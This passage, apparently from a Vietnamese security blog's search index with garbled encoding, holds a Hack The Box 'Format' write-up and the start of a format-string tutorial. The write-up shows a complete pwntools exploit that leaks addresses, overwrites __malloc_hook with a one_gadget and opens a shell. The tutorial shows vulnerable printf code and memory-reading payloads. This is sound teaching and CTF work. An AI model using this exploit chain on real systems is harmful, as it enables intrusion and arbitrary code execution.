\u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf6936a5\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7eb4a0\u0026#39;, \u0026#39;7f2bcf68f6bd\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;7f2bcf685f65\u0026#39;, \u0026#39;55ddf1fb92d0\u0026#39;, \u0026#39;7fff990a1be0\u0026#39;, \u0026#39;55ddf1fb90c0\u0026#39;, \u0026#39;7fff990a1cf0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;55ddf1fb926d\u0026#39;, \u0026#39;7f2bcf7eefc8\u0026#39;, \u0026#39;cdd017be270afb00\u0026#39;] [*] Switching to interactive mode Táº¡i Ä‘Ã¢y, mÃ¬nh tháº¥y cÃ³ giÃ¡ trá»‹ 0x55ddf1fb926d lÃ  Ä‘á»‹a chá»‰ táº¡i vá»‹ trÃ­ init+117, mÃ¬nh sáº½ dÃ¹ng giÃ¡ trá»‹ nÃ y Ä‘á»ƒ tÃ­nh base address, bypass cÆ¡ cháº¿ ASLR vÃ  giÃ¡ trá»‹ nÃ y nÃ³ náº±m á»Ÿ bye thá»© 37. 1 2 3 4 âœ Format git:(main) âœ— ./format âœ Format git:(main) âœ— ./format %37$p 0x56406ae4f26d Do cÆ¡ cháº¿ ASLR nÃªn giÃ¡ trá»‹ nÃ y sáº½ khÃ¡c á»Ÿ má»—i láº§n cháº¡y. BÆ°á»›c thá»© nháº¥t, chÃºng ta sáº½ vÆ°á»£t qua Ä‘Æ°á»£c cÆ¡ cháº¿ ASLR vá»›i Ä‘oáº¡n code sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 40 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;./format\u0026#34;) init_117 = 0x126d r = process(\u0026#34;./format\u0026#34;) input(\u0026#34;[+] attach gdb\u0026#34;) payload = b\u0026#39;%37$p\u0026#39; r.sendline(payload) init_leak = r.recvline() log.success(\u0026#34;LEAK : init+117 address: {}\u0026#34;.format(init_leak)) base_elf = int(init_leak,16) - 0x126d log.info(\u0026#34;Base ELF address: {}\u0026#34;.format(hex(base_elf))) elf.address = base_elf BÆ°á»›c 2: Leak Ä‘á»‹a chá»‰ __printf tá»« libc thÃ´ng qua printf() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pwndbg\u0026gt; disassemble echo Dump of assembler code for function echo: 0x0000559e0bc191a9 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc191ad \u0026lt;+4\u0026gt;:\tpush rbp 0x0000559e0bc191ae \u0026lt;+5\u0026gt;:\tmov rbp,rsp 0x0000559e0bc191b1 \u0026lt;+8\u0026gt;:\tsub rsp,0x110 0x0000559e0bc191b8 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000559e0bc191c1 \u0026lt;+24\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x0000559e0bc191c5 \u0026lt;+28\u0026gt;:\txor eax,eax 0x0000559e0bc191c7 \u0026lt;+30\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2e62] # 0x559e0bc1c030 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000559e0bc191ce \u0026lt;+37\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191d5 \u0026lt;+44\u0026gt;:\tmov esi,0x100 0x0000559e0bc191da \u0026lt;+49\u0026gt;:\tmov rdi,rax 0x0000559e0bc191dd \u0026lt;+52\u0026gt;:\tcall 0x559e0bc190a0 \u0026lt;fgets@plt\u0026gt; 0x0000559e0bc191e2 \u0026lt;+57\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191e9 \u0026lt;+64\u0026gt;:\tmov rdi,rax 0x0000559e0bc191ec \u0026lt;+67\u0026gt;:\tmov eax,0x0 0x0000559e0bc191f1 \u0026lt;+72\u0026gt;:\tcall 0x559e0bc19090 \u0026lt;printf@plt\u0026gt; 0x0000559e0bc191f6 \u0026lt;+77\u0026gt;:\tjmp 0x559e0bc191c7 \u0026lt;echo+30\u0026gt; End of assembler dump. pwndbg\u0026gt; disassemble 0x559e0bc19090 Dump of assembler code for function printf@plt: 0x0000559e0bc19090 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc19094 \u0026lt;+4\u0026gt;:\tbnd jmp QWORD PTR [rip+0x2f25] # 0x559e0bc1bfc0 \u0026lt;printf@got.plt\u0026gt; 0x0000559e0bc1909b \u0026lt;+11\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0] End of assembler dump. pwndbg\u0026gt; ChÃºng ta sá»­ dá»¥ng %s thay vÃ¬ %p bá»Ÿi vÃ¬ %s sáº½ Ä‘á»c Ä‘á»‹a giÃ¡ trá»‹ bÃªn trong vÃ¹ng nhá»› Ä‘Æ°á»£c truyá»n vÃ o printf vÃ  in ra cho Ä‘áº¿n khi gáº·p giÃ¡ trá»‹ null. Äiá»u Ä‘Ã³ cÃ³ nghÄ©a náº¿u Ä‘á»‹a chá»‰ cá»§a vÃ¹ng GOT Ä‘Æ°á»£c Ä‘Æ°a vÃ o thÃ¬ chÃºng ta cÃ³ thá»ƒ in nÃ³ sáº½ in ra Ä‘á»‹a chá»‰ cá»§a libc Ä‘ang chá»©a trong nÃ³. Cá»¥ thá»ƒ chÃºng ta sáº½ thá»±c hiá»‡n nhÆ° sau: 1 2 3 4 5 6 7 8 9 ... # ------------- Leaking _printf address through printf() printf_got_ptl = elf.got[\u0026#34;printf\u0026#34;] log.info(\u0026#34;printf@got.plt address: {}\u0026#34;.format(hex(printf_got_ptl))) r.sendline(b\u0026#39;AAAA%7$s\u0026#39; + p64(printf_got_ptl)) printf_leak = r.recv() printf_libc = u64(printf_leak[4:10].ljust(8, b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;Leaked __printf: {}\u0026#34;.format(hex(printf_libc))) ... ChÃºng ta láº¥y Ä‘á»‹a chá»‰ printf@plt thÃ´ng qua lá»‡nh elf.got[\u0026quot;printf\u0026quot;], sau Ä‘Ã³ gá»­i payload cÃ³ dáº¡ng \u0026quot;AAAA%7$s\u0026quot; + p64(printf_got_ptl). Sá»‘ 7 á»Ÿ Ä‘Ã¢y lÃ  vÃ¬ Ä‘á»‹a chá»‰ cá»§a got p64(printf_got_ptl) nÄƒm á»Ÿ vá»‹ trÃ­ thá»© 7 trÃªn stack, do Ä‘Ã³ %7s sáº½ láº¥y Ä‘á»‹a chá»‰ nÃ y ra vÃ  in giÃ¡ trá»‹ chá»©a trong nÃ³ cÅ©ng chÃ­nh lÃ  Ä‘á»‹a chá»‰ libc. Lá»‡nh ljust(8, \u0026quot;\\x00\u0026quot;) Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ thÃªm cÃ¡c gÃ­a trá»‹ \\x00 vÃ¬ cÆ¡ cháº¿ align 1 2 3 4 5 6 7 8 9 10 11 12 13 14 âœ Format git:(main) âœ— python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 15866 [+] attach gdb [+] LEAK : init+117 address: b\u0026#39;0x563d767e026d\\n\u0026#39; [*] Base ELF address: 0x563d767df000 [*] printf@got.plt address: 0x563d767e2fc0 [+] Leaked __printf: 0x7fc6d53d6e10 [*] Stopped process \u0026#39;./format\u0026#39; (pid 15866) Sá»­ dá»¥ng libc.blukat.me vÃ  Ä‘á»‹a chá»‰ cá»§a libc vá»«a cÃ³ Ä‘Æ°á»£c Ä‘á»ƒ kiá»ƒm tra phiÃªn báº£n cá»§a libc. BÆ°á»›c 3 chiáº¿m quyá»n Ä‘iá»u khiá»ƒn Khi kiá»ƒm tra vá»›i checksec, chÃºng ta tháº¥y ráº±ng binary Ä‘Æ°á»£c setup vá»›i Full RELRO, Ä‘iá»u Ä‘Ã³ cÃ³ nghÄ©a chÃºng ta khÃ´ng thá»ƒ ghi Ä‘Ã¨ lÃªn GOT, tuy nhiÃªn ná»™i dung cá»§a thÆ° viá»‡n libc chÃºng ta váº«n cÃ³ thá»ƒ ghi Ä‘á»±c. Do Ä‘Ã³, má»¥c tiÃªu sáº½ ghi Ä‘Ã¨ lÃªn con trá» __malloc_hook Khi chÃºng ta gá»­i vÃ o printf() chuá»—i quÃ¡ lá»›n, __malloc_hook Ä‘Æ°á»£c gá»i báº¥t cá»© khi nÃ o malloc() Ä‘Æ°á»£c dÃ¹ng. ChÃºng ta gá»i malloc() báº±ng cÃ¡ch gá»i printf(\u0026quot;%100000$c\u0026quot;), lá»‡nh gá»i nÃ y sáº½ cáº¥p phÃ¡t nhiá»u byte trÃªn stack vÃ  buá»™c libc pháº£i cáº¥p phÃ¡t thÃªm vÃ¹ng nhá»› trÃªn heap thay vÃ¬ trÃªn stack. Khi Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ ghi Ä‘Ã¨ giÃ¡ trá»‹ cá»§a __malloc_hook báº±ng %6n vÃ  thay AAAA Ä‘áº§u thÃ nh Ä‘á»‹a chá»‰ cá»§a __malloc_hook. ChÃºng ta sá»­ dá»¥ng kÄ© thuáº­t one_gadget Ä‘á»ƒ thá»±c thi execve(\u0026quot;/bin/sh\u0026quot;) trong libc. 1 2 3 4 5 6 7 8 9 10 11 12 13 âœ Format git:(main) âœ— one_gadget libc6_2.27-3ubuntu1_amd64.so 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: rsp \u0026amp; 0xf == 0 rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL Tiáº¿p theo, chÃºng ta tÃ­nh cÃ¡c Ä‘á»‹a chá»‰ cáº§n thiáº¿t. Vá»›i libc khi chÆ°a cháº¡y, chÃºng ta Ä‘á»c Ä‘á»‹a chá»‰ cá»§a printf: 1 2 âœ Format git:(main) âœ— objdump -TR libc6_2.27-3ubuntu1_amd64.so| grep \u0026#34; printf$\u0026#34; 0000000000064e80 g DF .text 00000000000000c3 GLIBC_2.2.5 printf ChÃºng ta tháº¥y ráº±ng khoáº£ng cÃ¡ch tá»« printf tá»›i base address lÃ  0x64e80, do Ä‘Ã³, Ä‘á»ƒ tÃ­nh base address, chÃºng ta láº¥y Ä‘á»‹a chá»‰ cá»§a printf leak Ä‘Æ°á»£c khi thá»±c thi trá»« Ä‘i 0x64e80.\nSau khi cÃ³ Ä‘Æ°á»£c base address, chÃºng ta tÃ­nh Ä‘á»‹a chá»‰ cá»§a malloc_hook_addr vÃ  one_gadget báº±ng cÃ¡ch láº¥y base address cá»™ng vá»›i khoáº£ng cÃ¡ch cá»§a cÃ¡c hÃ m (láº¥y báº±ng cÃ¡ch Ä‘á»c static) 1 2 3 4 # Calculating base libc, __malloc_hook and one_gadget --- base_libc = printf_libc - 0x64e80 malloc_hook_addr = base_libc + 0x00000000003ebc30 one_gadget = base_libc + 0x4f322 Ta sá»­ dá»¥ng pwnlib.fmtstr - cÃ´ng cá»¥ khai thÃ¡c lá»—i format string Ä‘á»ƒ tÃ­nh vÃ  ghi Ä‘Ã¨ Ä‘á»‹a chá»‰ __malloc_hook vá»›i one gadget vÃ  kÃ­ch hoáº¡t nÃ³. 1 2 3 4 5 6 # Overriding __malloc_hook with one_gadget --- p.sendline(fmtstr_payload(6, {malloc_hook_addr: one_gadget})) p.recv() p.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger p.interactive() p.close() BÆ°á»›c 4 - Cháº¡y mÃ£ khai thÃ¡c Cháº¡y mÃ£ khai thÃ¡c, ta cÃ³ Ä‘Æ°á»£c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 âœ Format git:(main) âœ— python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 167.99.202.131 on port 32399: Done [+] LEAK : init+117 address: b\u0026#39;0x55afb922b26d\\n\u0026#39; [*] Base ELF address: 0x55afb922a000 [*] printf@got.plt address: 0x55afb922dfc0 [+] Leaked __printf: 0x7f6b96c3be80 exploit.py:65: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger [*] trigged malloc_hook [*] Switching to interactive mode $ ls flag.txt format run_challenge.sh $ cat flag.txt HTB{mall0c_h00k_f0r_th3_w1n!} $ [*] Interrupted [*] Closed connection to 167.99.202.131 port 32399 âœ Format git:(main) âœ— MÃ£ khai thÃ¡c: exploit.py Nguá»“n tham kháº£o https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Format/notes.md ","description":"Can you hear the echo? ","id":9,"section":"posts","tags":["exploitation"],"title":"Hackthebox- Format","uri":"https://minhlongmt183.github.io/posts/htb_format/"},{"content":"Má»Ÿ Ä‘áº§u Khai thÃ¡c lá»—i format string lÃ  má»™t kÄ© thuáº­t cho phÃ©p chÃºng ta chiáº¿m quyá»n kiá»ƒm soÃ¡t cá»§a má»™ chÆ°Æ¡ng trÃ¬nh Ä‘áº·c quyá»n. Giá»‘ng nhÆ° buffer overflow, format string cÅ©ng phá»¥ thuá»™c vÃ o lá»—i khi láº­p trÃ¬nh, nhá»¯ng lá»—i nÃ y khi nhÃ¬n sÆ¡ qua thÃ¬ khÃ´ng tháº¥y cÃ³ áº£nh hÆ°á»Ÿng gÃ¬ Ä‘áº¿n chÆ°Æ¡ng trÃ¬nh.\nNá»™i dung chÃ­nh Format Paraameters 1 function sá»­ dá»¥ng Ä‘á»‹nh dáº¡ng chuá»—i, nhÆ° lÃ  prrintf(), chá»‰ cáº§n xem xÃ©t Ä‘á»‹nh dáº¡ng Ä‘Æ°á»£c truyá»n vÃ o nÃ³ vÃ  thá»±c hiá»‡n nhá»¯ng hoáº¡t Ä‘á»™ng Ä‘áº·c biá»‡t má»—i khi gáº·p pháº£i tham sá»‘ truyá»n vÃ o. Má»—i tham sá»‘ Ä‘á»‹nh dáº¡ng chuá»—i thÃ¬ tÆ°Æ¡ng á»©ng vá»›i má»™t tham sá»‘ truyá»n vÃ o, vÃ­ dá»¥ chuá»—i chÃºng ta sá»­ dá»¥ng 4 tham sá»‘ Ä‘á»‹nh dáº¡ng thÃ¬ cáº§n pháº£i truyá»n 4 biáº¿n tÆ°Æ¡ng Æ°ng. Nhá»¯ng dáº¡ng Ä‘á»‹nh dáº¡ng tham sá»‘ thÆ°á»ng gáº·p: Parameter Input Type Output Type %d Value Decimal %u Value Unsigned decimal %x Value Hexadecimal %s Pointer String %n Pointer Number of bytes written so far ChÃºng ta sáº½ thá»­ vá»›i chÆ°Æ¡ng trÃ¬nh sau: fmt_uncommon.c\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int A = 5, B = 7, count_one, count_two; // Example of a %n format string printf(\u0026#34;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\u0026#34;, \u0026amp;count_one, \u0026amp;count_two); printf(\u0026#34;count_one: %d\\n\u0026#34;, count_one); printf(\u0026#34;count_two: %d\\n\u0026#34;, count_two); // Stack example printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); exit(0); } ChÆ°Æ¡ng trÃ¬nh sá»­ dá»¥ng Ä‘á»‹nh dáº¡ng %n trong hÃ m printf(). ChÃºng ta cháº¡y vÃ  xem output nhÆ° tháº¿ nÃ o. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 âœ fmt git:(main) âœ— gcc fmt_uncommon.c fmt_uncommon.c: In function â€˜mainâ€™: fmt_uncommon.c:14:34: warning: format â€˜%xâ€™ expects argument of type â€˜unsigned intâ€™, but argument 3 has type â€˜int *â€™ [-Wformat=] 14 | printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); | ~~~^ ~~ | | | | unsigned int int * | %08ls âœ fmt git:(main) âœ— ./a.out The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at c6658b68. B is 7. âœ fmt git:(main) âœ— %n lÃ  Ä‘á»‹nh dáº¡ng duy nháº¥t dÃ¹ng Ä‘á»ƒ ghi dá»¯ liá»‡u thay vÃ¬ hiá»ƒn thá»‹ dá»¯ liá»‡u. Khi hÃ m Ä‘á»‹nh dáº¡ng gáº·p tham sá»‘ %n, nÃ³ sáº½ viáº¿t tá»•ng sá»‘ byte mÃ  nÃ³ Ä‘Ã£ Ä‘Æ°á»£c viáº¿t bá»Ÿi hÃ m vÃ o Ä‘á»‹a chá»‰ tÆ°Æ¡ng á»©ng cá»§a biáº¿n. VÃ­ dá»¥ vá»›i hÃ m fmt_common trÃªn, A cÃ³ giÃ¡ trá»‹ lÃ  46 bá»Ÿi vÃ¬ tá»•ng sá»‘ byte mÃ  hÃ m printf Ä‘Ã£ in ra cho tá»›i khi gáº·p %n lÃ  46 kÃ­ tá»±: 1 2 3 \u0026gt;\u0026gt;\u0026gt; la = \u0026#34;The number of bytes written up to this point X\u0026#34; \u0026gt;\u0026gt;\u0026gt; len(la) 46 Xem xÃ©t cÃ¢u lá»‡nh sau: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); Khi hÃ m printf() Ä‘Æ°á»£c gá»i, cÃ¡c tham sá»‘ Ä‘Æ°á»£c dÆ°a vÃ o stack theo thá»© tá»± ngÆ°á»£c láº¡i: Top of the Stack Address of format string Value of A Address of A Value of B Bottom of the Stack HÃ m printf sáº½ Ä‘i qua tá»«ng kÃ­ tá»± má»™t, náº¿u kÃ­ tá»± khÃ´ng báº¯t Ä‘áº§u báº±ng má»™t format-parameter, kÃ­ tá»± nÃ y sáº½ Ä‘Æ°á»£c copy ra output. Náº¿u má»™t format-parameter Ä‘Æ°á»£c gáº·p, nÃ³ sáº½ láº¥y giÃ¡ trá»‹ cá»§a Ä‘á»‘i sá»‘ trong stack tÆ°Æ¡ng á»©ng vá»›i parameter. Trong trÆ°á»ng há»£p sá»‘ argeument trong stack Ã­t hÆ¡n sá»‘ format-parameter trong string thÃ¬ Ä‘iá»u gÃ¬ sáº½ xáº£y ra? VÃ­ dá»¥: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); Ta sáº½ tiáº¿n hÃ nh thay Ä‘á»•i 1 tÃ­ á»Ÿ chÆ°Æ¡ng trÃ¬nh fmt_uncommon2.c 1 2 3 4 5 6 7 âœ fmt git:(main) âœ— sed -e \u0026#39;s/, B)/)/\u0026#39; fmt_uncommon.c \u0026gt; fmt_uncommon2.c âœ fmt git:(main) âœ— diff fmt_uncommon.c fmt_uncommon2.c 14c14 \u0026lt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); --- \u0026gt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); âœ fmt git:(main) âœ— Compile vÃ  cháº¡y, xem káº¿t quáº£: 1 2 3 4 5 6 âœ fmt git:(main) âœ— gcc -o fmt_uncommon2 fmt_uncommon2.c -w âœ fmt git:(main) âœ— ./fmt_uncommon2 The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at 74f2e9b8. B is 0. ChÃºng ta dÃ¹ng -w Ä‘á»ƒ táº¯t Ä‘i nhá»¯ng warning tá»« compiler. Khi cháº¡y, ta tháº¥y B lÃºc bÃ¢y giá» cÃ³ giÃ¡ trá»‹ lÃ  0. Táº¡i sao B láº¡i cÃ³ giÃ¡ trá»‹ lÃ  0 trong khi giÃ¡ trá»‹ khá»Ÿi táº¡o cá»§a B lÃ  7? Ta Ä‘Ã£ biáº¿t ráº±ng, khi hÃ m printf() gá»i, nÃ³ sáº½ Ä‘áº©y cÃ¡c Ä‘á»‘i sá»‘ vÃ o trong stack vÃ  khi gáº·p format-parameter, nÃ³ sáº½ vÃ o stack vÃ  láº¥y giÃ¡ trá»‹ nÃ y ra. Tuy nhiÃªn, trong trÆ°á»ng há»£p nÃ y, sá»‘ format-parameter láº¡i nhiá»u hÆ¡n argument, nÃªn Ä‘áº¿n tham sá»‘ thá»© 3, hÃ m printf cÅ©ng vÃ o stack Ä‘á»ƒ láº¥y giÃ¡ trá»‹ táº¡i vá»‹ trÃ­ thá»© 3 trÃªn stack. 0 lÃ  giÃ¡ trá»‹ Ä‘áº§u tiÃªn mÃ  hÃ m printf tÃ¬m tháº¥y trÃªn stack. The Format String Vulnerability ÄÃ´i khi programmer sá»­ dá»¥ng printf(string) thay vÃ¬ printf(\u0026quot;%s\u0026quot;, string). LÃºc nÃ y, hÃ m printf sáº½ nháº­n trá»±c tiáº¿p Ä‘á»‹a chá»‰ cá»§a string vÃ  in tá»«ng kÃ­ tá»± trong string Ä‘Ã³. Äoáº¡n code sau thá»ƒ hiá»‡n hoáº¡t Ä‘á»™ng cá»§a 2 cÃ¡ch sá»­ dá»¥ng nÃ y. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char text[1024]; static int test_val = -72; if (argc \u0026lt; 2) { printf(\u0026#34;Usage: %s \u0026lt;text to print\u0026gt;\\n\u0026#34;, argv[0]); exit(0); } strcpy(text. argv[1]); printf(\u0026#34;The right way to print user-controlled input:\\n\u0026#34;); printf(\u0026#34;%s\u0026#34;, text); printf(\u0026#34;\\n The wrong way to print user-controlled input:\\n\u0026#34;); printf(text); printf(\u0026#34;\\n\u0026#34;); // Debug output printf(\u0026#34;[*] test_val @ 0x%08x = %d 0x%08x\\n\u0026#34;, \u0026amp;test_val, test_val, test_val); exit(0); } Tiáº¿n hÃ nh biÃªn dá»‹ch vÃ  xem káº¿t quáº£: 1 2 3 4 5 6 7 âœ fmt git:(main) âœ— gcc -o fmt_vuln fmt_vuln.c -w âœ fmt git:(main) âœ— ./fmt_vuln hello_world The right way to print user-controlled input: hello_world The wrong way to print user-controlled input: hello_world [*] test_val @ 0x8a756010 = -72 0xffffffb8 Vá»›i input lÃ  hello_world, cáº£ 2 cÃ¡ch Ä‘á»u hoáº¡t Ä‘á»™ng tá»‘t. Tuy nhiÃªn, náº¿u input nháº­p vÃ o chá»©a format parameter liá»‡u cáº£ 2 cÃ³ nhÆ° nhau hay khÃ´ng? 1 2 3 4 5 6 âœ fmt git:(main) âœ— ./fmt_vuln hello_world%x The right way to print user-controlled input: hello_world%x The wrong way to print user-controlled input: hello_world128012a0 [*] test_val @ 0x10ff0010 = -72 0xffffffb8 Tá»« output trÃªn ta tháº¥y, vá»›i cÃ¡ch dÃ¹ng thá»© 2, giÃ¡ trá»‹ trÃªn stack Ä‘Ã£ Ä‘Æ°á»£c in ra. Vá»›i má»—i tham sá»‘ %x Ä‘Æ°á»£c sá»§ dá»¥ng, 4 bytes trÃªn stack sáº½ Ä‘Æ°á»£c in ra. Do Ä‘Ã³, náº¿u láº·p láº¡i quÃ¡ trÃ¬nh nÃ y, chÃºng ta cÃ³ thá»ƒ láº¥y toÃ n bá»™ dá»¯ liá»‡u trÃªn stack. 1 2 3 4 5 6 âœ fmt git:(main) âœ— ./fmt_vuln $(perl -e \u0026#39;print \u0026#34;%08x.\u0026#34;x40\u0026#39;) The right way to print user-controlled input: %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x. The wrong way to print user-controlled input: 925a72a0.00000000.946a01e7.00000030.000000c8.c2052148.947819a8.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.947a9700.c2051d60.945abab0.94781000.00000000.c2051de0.00000000.00000000. [*] test_val @ 0x92502010 = -72 0xffffffb8 Ta tháº¥y dá»¯ liá»‡u trÃªn stack Ä‘Ã£ Ä‘Æ°á»£c in ra theo tá»«ng nhÃ³m 4 bytes, vÃ  4 byte nÃ y theo thá»© tá»± ngÆ°á»£c do kiáº¿n trÃºc little-endian. Nhá»¯ng bytes 0x25, 0x30, 0x38, 0x78, 0x2e dÆ°á»ng nhÆ° láº·p láº¡i nhiá»u láº§n. CÃ¹ng xem thá»­ nhá»¯ng byte nÃ y cÃ³ giÃ¡ trá»‹ lÃ  gÃ¬? 1 2 âœ fmt git:(main) âœ— printf \u0026#34;\\x25\\x30\\x38\\x78\\x2e\\n\u0026#34; %08x. NhÆ° chÃºng ta cÃ³ thá»ƒ tháº¥y, vÃ¹ng nhá»› nÃ y lÃ  giÃ¡ trá»‹ cá»§a format-string. VÃ¬ hÃ m printf luÃ´n náº±m á»Ÿ vá»‹ trÃ­ cao nháº¥t trÃªn stack frame vÃ  format-string cÃ³ thá»ƒ náº±m á»Ÿ báº¥t kÃ¬ Ä‘Ã¢u trÃªn stack. NÃ³ sáº½ náº±m dÆ°á»›i frame pointer hiá»‡n táº¡i.\nReading from Arbitrary Memory Addresses Äá»‹nh dáº¡ng %s Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ Ä‘á»c Ä‘á»‹a chá»‰ vÃ¹ng nhá»› báº¥t kÃ¬. VÃ¬ nÃ³ cÃ³ thá»ƒ Ä‘á»c dá»¯ liá»‡u cá»§a chuá»—i Ä‘á»‹nh dáº¡ng ban Ä‘áº§u, má»™t pháº§n cá»§a chuá»—i Ä‘á»‹nh dáº¡ng ban Ä‘áº§u cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ cung cáº¥p Ä‘á»‹a chá»‰ cho tham sá»‘ Ä‘á»‹nh dáº¡ng %s, nhÆ° Ä‘Æ°á»£c hiá»ƒn thá»‹ á»Ÿ Ä‘Ã¢y: 1 2 3 4 5 6 âœ fmt git:(main) âœ— ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The right way to print user-controlled input: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The wrong way to print user-controlled input: AAAAff9a1a6c.f7d7068c.08049234.f7d7976c.f7f6f110.ff9a1aac.ff9a1f24.00000003.00000000.f7fa3000.41414141 [*] test_val @ 0x0804c02c = -72 0xffffffb8 4 bytes cá»§a 0x41 cho tháº¥y tham sá»‘ thá»© 11 lÃ  dá»¯ liá»‡u báº¯t dáº§u cá»§a chuá»—i chÃºng ta nháº­p vÃ o. Náº¿u chÃºng ta thay format-parameter thá»© 4 thÃ nh %s thay vÃ¬ %x, hÃ m printf sáº½ in ra chuá»—i táº¡i Ä‘á»‹a chá»‰ 0x41414141. Viá»‡c nÃ y sáº½ lÃ m crash chÆ°Æ¡ng trÃ¬nh vÃ¬ 0x41414141 lÃ  má»™t Ä‘á»‹a chá»‰ khÃ´ng há»£p lá»‡. NhÆ°ng, náº¿u Ä‘á»‹a chá»‰ nÃ y há»£p lá»‡, thÃ¬ ta cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c chuá»—i táº¡i Ä‘á»‹a chá»‰ nÃ y. Ta dÃ¹ng má»™t chÆ°Æ¡ng trÃ¬nh cÃ³ tÃªn lÃ  getenvaddr Ä‘á»ƒ láº¥y Ä‘á»‹a chá»‰ cá»§a biáº¿n mÃ´i trÆ°á»ng PATH. ","description":"Khai thÃ¡c format string lÃ  má»™t kÄ© thuáº­t cho phÃ©p báº¡n chiáº¿m quyá»n kiá»ƒm soÃ¡t cá»§a má»™t chÆ°Æ¡ng trÃ¬nh Ä‘áº·c quyá»n.... ","id":10,"section":"posts","tags":["exploitation"],"title":"Khai 